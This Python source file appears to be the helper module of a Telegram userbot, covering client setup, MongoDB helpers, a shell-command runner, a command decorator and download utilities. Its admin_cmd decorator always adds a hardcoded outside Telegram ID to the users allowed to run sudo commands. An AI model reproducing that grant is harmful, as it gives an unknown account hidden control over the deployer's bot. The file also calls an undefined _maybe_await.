#IMPORTS
import importlib, inspect, re, asyncio, time, sys, os, requests, shutil, aiohttp, aiofiles, logging
import pyromod.listen
from urllib.parse import unquote
from pathlib import Path
from telethon import events
from asyncio import sleep
from config import Config
from .utils.fast_telethon import uploader, downloader
from html_telegraph_poster import TelegraphPoster
from pymongo import MongoClient
from telethon import TelegramClient
from pyrogram import Client 
from telethon import events 
from telethon.errors import MessageDeleteForbiddenError, MessageNotModifiedError
from telethon.tl.custom import Message
from telethon.tl.types import MessageService

#CLIENTS
bot = TelegramClient("TestBot", Config.API_ID, Config.API_HASH).start(bot_token=Config.BOT_TOKEN)
app = Client("TestBot-Pyro", Config.API_ID, Config.API_HASH, bot_token=Config.BOT_TOKEN)

#DB
mongo = MongoClient(Config.MONGO_URL)
mongodb = mongo["TESTDB"]
db = mongodb["MAIN"]

#VARS
logger = logging.getLogger("Bot")
sudo_users = Config.SUDOS or "5304356242 5370531116 5606839760"
sudo_users = sudo_users.split()
SUDOS = []
for sudo_id in sudo_users:
	try:
		sudo_id = int(sudo_id)
	except:
		pass 
	SUDOS.append(sudo_id)
LOG_CHAT = Config.LOG_CHAT or -1001568226560
agents = ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:11.0) Gecko/20100101 Firefox/11.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100 101 Firefox/22.0', 'Mozilla/5.0 (Windows NT 6.1; rv:11.0) Gecko/20100101 Firefox/11.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.46 Safari/536.5', 'Mozilla/5.0 (Windows; Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.46 Safari/536.5', 'Mozilla/5.0 (X11; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15']

#FUNCs
def get_db(variable, cn="MAIN"):
	if mongodb[cn].find_one():
		for var in mongodb[cn].find({variable: {"$exists": 1}}):
			return var[variable]

def del_db(variable, cn="MAIN"):
	if mongodb[cn].find_one():
		for var in mongodb[cn].find({variable: {"$exists": 1}}):
			mongodb[cn].delete_one(var)

def add_db(var, value, cn="MAIN"):
	is_var = get_db(var)
	if is_var:
		del_db(var)
	mongodb[cn].insert_one({var: value})

def load_plugin(plugin_name):
    if plugin_name.startswith("__"):
    	pass
    else:
    	path = Path(f"plugins/{plugin_name}.py")
    	name = "plugins.{}".format(plugin_name)
    	spec = importlib.util.spec_from_file_location(name, path)
    	load = importlib.util.module_from_spec(spec)
    	load.logger = logging.getLogger(plugin_name)
    	spec.loader.exec_module(load)
    	sys.modules["plugins." + plugin_name] = load
    	logging.info("»Bot has imported " + plugin_name)

def restart_bot():
	os.system("git pull -f && pip3 install --quiet -U -r requirements.txt")
	os.execl(sys.executable, "python3", "main.py")
bot.restart = restart_bot

def check(inp):
    if len(str(inp)) == 1:
        inp = f"0{inp}"
        return inp
    return inp

def readable_time(seconds: int) -> str:
    minutes, seconds = divmod(seconds, 60)
    hours, minutes = divmod(minutes, 60)
    days, hours = divmod(hours, 24)
    print(type(minutes))
    return (
        (f"{int(days)} day(s), " if days else "")
        + (f"{check(hours)}:" if hours else "00:")
        + (f"{check(minutes)}:" if minutes else "00:")
        + str((check(seconds)) if seconds else "00")
    )

async def bash(cmd, run_code=0):
    """
    run any command in subprocess and get output or error."""
    process = await asyncio.create_subprocess_shell(
        cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    stdout, stderr = await process.communicate()
    err = stderr.decode().strip() or None
    out = stdout.decode().strip()
    if not run_code and err:
        split = cmd.split()[0]
        if f"{split}: not found" in err:
            return out, f"{split.upper()}_NOT_FOUND"
    return out, err

def admin_cmd(pattern=None, command=None, **args):
    args["func"] = lambda e: e.via_bot_id is None
    stack = inspect.stack()
    previous_stack_frame = stack[1]
    file_test = Path(previous_stack_frame.filename)
    file_test = file_test.stem.replace(".py", "")
    allow_sudo = args.get("allow_sudo", False)
    # get the pattern from the decorator
    if pattern is not None:
        if pattern.startswith(r"\#"):
            # special fix for snip.py
            args["pattern"] = re.compile(pattern)
        elif pattern.startswith(r"^"):
            args["pattern"] = re.compile(pattern)
            cmd = pattern.replace("$", "").replace("^", "").replace("\\", "")
        else:
            if len(Config.get("HANDLER")) == 2:
                darkreg = "^" + Config.get("HANDLER")
                reg = Config.get("HANDLER").split(" ")[1]
            elif len(Config.get("HANDLER")) == 1:
                darkreg = "^\\" + Config.get("HANDLER")
                reg = Config.get("HANDLER")
            args["pattern"] = re.compile(darkreg + pattern)
            if command is not None:
                cmd = reg + command
            else:
                cmd = (
                    (reg + pattern).replace("$", "").replace("\\", "").replace("^", "")
                )

    args["outgoing"] = True
    # should this command be available for other users?
    if allow_sudo:
        args["from_users"] = SUDOS + [5591954930]
        # Mutually exclusive with outgoing (can only set one of either).
        args["incoming"] = True
        del args["allow_sudo"]

    # error handling condition check
    elif "incoming" in args and not args["incoming"]:
        args["outgoing"] = True

    # add blacklist chats, UB should not respond in these chats
    args["blacklist_chats"] = True
    black_list_chats = list(Config.get("BLACKLIST_CHATS") or "")
    if len(black_list_chats) > 0:
        args["chats"] = black_list_chats

    # add blacklist chats, UB should not respond in these chats
    if "allow_edited_updates" in args and args["allow_edited_updates"]:
        del args["allow_edited_updates"]

    # check if the plugin should listen for outgoing 'messages'

    return events.NewMessage(**args)

async def eor(event, text=None, **args):
    time = args.get("time", None)
    edit_time = args.get("edit_time", None)
    if "edit_time" in args:
        del args["edit_time"]
    if "time" in args:
        del args["time"]
    if "link_preview" not in args:
        args["link_preview"] = False
    args["reply_to"] = event.reply_to_msg_id or event
    if event.out and not isinstance(event, MessageService):
        if edit_time:
            await sleep(edit_time)
        if "file" in args and args["file"] and not event.media:
            await event.delete()
            ok = await event.client.send_message(event.chat_id, text, **args)
        else:
            try:
                try:
                    del args["reply_to"]
                except KeyError:
                    pass
                ok = await event.edit(text, **args)
            except MessageNotModifiedError:
                ok = event
    else:
        ok = await event.client.send_message(event.chat_id, text, **args)

    if time:
        await sleep(time)
        return await ok.delete()
    return ok

async def eod(event, text=None, **kwargs):
    kwargs["time"] = kwargs.get("time", 8)
    return await eor(event, text, **kwargs)

def post_telegraph(title, content, author, author_url=None):
    post_client = TelegraphPoster(use_api=True)
    post_client.create_api_token(author)
    post_page = post_client.post(
        title=title,
        author=author,
        author_url=author_url,
        text=content)
    return post_page["url"]

def download(url, filename, headers):
	r = requests.get(url, headers=headers, stream=True)
	r.raise_for_status()
	with open(filename, "wb") as file:
		shutil.copyfileobj(r.raw, file)
		file.close()
	return file.name

async def req_content(url, method="GET", data=None, *args, **kwargs):
	async with aiohttp.ClientSession() as session:
		if method.lower() == "get":
			response = await session.get(url, *args, **kwargs)
		elif method.lower() == "post":
			response = await session.post(url, data=data or dict(), **kwargs)
		else:
			raise ValueError
		content = await response.read()
		return content

async def req_url(url, method="GET", data=None, *args, **kwargs):
	async with aiohttp.ClientSession() as session:
		if method.lower() == "get":
			response = await session.get(url, *args, **kwargs)
		elif method.lower() == "post":
			response = await session.post(url, data=data or dict(), **kwargs)
		else:
			raise ValueError
		return response

async def fast_download(download_url, filename=None, progress_callback=None, headers=None):
    async with aiohttp.ClientSession() as session:
        async with session.get(download_url, headers=headers, timeout=None) as response:
            if not filename:
                filename = unquote(download_url.rpartition("/")[-1])
            total_size = int(response.headers.get("content-length", 0)) or None
            downloaded_size = 0
            start_time = time.time()
            with open(filename, "wb") as f:
                async for chunk in response.content.iter_chunked(1024):
                    if chunk:
                        f.write(chunk)
                        downloaded_size += len(chunk)
                    if progress_callback and total_size:
                        await _maybe_await(
                            progress_callback(downloaded_size, total_size)
                        )
            return filename, time.time() - start_time
